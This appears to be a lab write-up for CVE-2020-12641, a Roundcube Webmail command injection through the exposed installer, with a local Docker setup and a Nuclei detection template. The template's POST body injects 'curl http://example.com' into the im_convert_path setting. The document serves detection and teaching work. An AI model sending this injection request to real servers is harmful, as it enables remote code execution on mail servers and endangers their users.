# CVE-2020-12641 : Roundcube Webmail - Command Injection

## Description:
Roundcube Webmail before 1.4.4 contains a command injection caused by shell metacharacters in configuration settings for im_convert_path or im_identify_path, letting attackers execute arbitrary code, exploit requires attacker to control configuration settings.

## Reference:
- https://nvd.nist.gov/vuln/detail/CVE-2020-12641
- https://github.com/mbadanoiu/MAL-004
- https://github.com/mbadanoiu/CVE-2020-12641

## Vulnerable Setup

- Execute the following commands to start an unconfigured roundcube mailserver:

```
docker compose up --build -d
```

- This vulnerable version of roundcube has the installer exposed via the config setting `$config['enable_installer'] = true;` in `config.ini.php`.

## Exploitation Steps

- Visit: http://localhost/roundcube

- This will display the login page the config settings can be found at http://localhost/roundcube/installer/

- By making a POST request to http://localhost/roundcube/installer/index.php with the body parameter `_im_convert_path` it is possible to inject a system command into the `config.ini.php` file on the server.

- When any user opens any email containing a "non-standard" image this config setting will get executed, as an example an attacker can send a TIFF image to the user and roundcube will attempt to convert it to "JPG" format triggering the arbitrary code in `im_convert_path`

## Steps to Write Nuclei Template

**HTTP Request Section**

```
http:
  - method: POST
    path:
      - "{{BaseURL}}/installer/index.php"
      - "{{BaseURL}}/roundcube/installer/index.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: _step=2&_product_name=Roundcube+Webmail&_support_url=&_skin_logo=&_temp_dir=%2Fvar%2Fwww%2Fhtml%2Froundcube%2Ftemp%2F&_des_key=aaCGmrf1vc2NIJ8whIA3aG9x&_enable_spellcheck=1&_spellcheck_engine=googie&_identities_level=0&_log_driver=file&_log_dir=%2Fvar%2Fwww%2Fhtml%2Froundcube%2Flogs%2F&_syslog_id=roundcube&_syslog_facility=8&_dbtype=mysql&_dbhost=localhost&_dbname=roundcube&_dbuser=roundcube&_dbpass=roundcube&_db_prefix=&_default_host%5B%5D=localhost&_default_port=143&_username_domain=&_auto_create_user=1&_sent_mbox=Sent&_trash_mbox=Trash&_drafts_mbox=Drafts&_junk_mbox=Junk&_smtp_server=localhost&_smtp_port=587&_smtp_user=%25u&_smtp_pass=%25p&_smtp_user_u=1&_smtp_log=1&_language=&_skin=elastic&_mail_pagesize=50&_addressbook_pagesize=50&_prefer_html=1&_htmleditor=0&_draft_autosave=300&_mdn_requests=0&_mime_param_folding=1&_plugins_autologon=autologon&_plugins_enigma=enigma&_plugins_zipdownload=zipdownload&submit=UPDATE+CONFIG&G&_im_convert_path=curl+http%3a//example.com
```

- This sends a POST request to both `/installer/index.php` and `/roundcube/installer/index.php`.

- The POST request body is a submission of the `_step_2` form with the standard configuration options plus `&_im_convert_path=curl+http%3a//example.com` which will inject this `curl` command into `$config['im_convert_path']` of the `/var/www/html/roundcube/config/config.inc.php` file

- Each time users of the Roundcube webmail server recieve an email containing a "non-standard" image, Roundcube will attempt to convert it to "JPG" using this config line.

**Matchers Section**

```
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - 'Roundcube Webmail Installer'
          - 'The config file was saved successfully'
        condition: and
        part: body
```

- `type: status` ensures that the server responded with a successful `200 OK` status.

- `type: word & condition:` and ensures all the expected content is present in the body.

## Nuclei Template URL : [CVE-2020-12641](https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2020/CVE-2020-12641.yaml)

## Nuclei Command :

```bash
nuclei -u http://localhost -id CVE-2020-12641 -vv
```
